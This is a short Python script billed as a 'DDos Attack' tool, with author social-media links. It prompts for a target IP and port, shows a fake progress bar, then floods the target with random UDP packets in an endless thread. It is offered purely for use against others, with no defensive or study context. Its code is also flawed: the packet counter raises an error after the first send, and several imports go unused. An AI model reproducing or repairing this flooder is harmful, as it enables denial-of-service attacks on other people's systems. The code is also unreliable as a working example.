import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
print("figlet DDos Attack")
print
print("Author: HA-MRX")
print("YouTube: https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
print("Github: https://github.com/Ha3MrX")
print("Facebook: https://www.facebook.com/muhamad.jabar222")
print
ip = input("IP Target : ")
port = input("Port       : ")

os.system("cls")
print("Figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
os.system("cls")
print("[=====               ] 25%")
time.sleep(5)
os.system("cls")
print("[==========          ] 50%")
time.sleep(5)
os.system("cls")
print("[===============     ] 75%")
time.sleep(5)
os.system("cls")
print("[====================] 100%")
time.sleep(3)
#why are you adding delay?
sent = 0


def send():
    while True:
        sock.sendto(bytes, (ip,int(port)))
        sent = sent + 1 
        print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
  
threading.Thread(target=send).start()


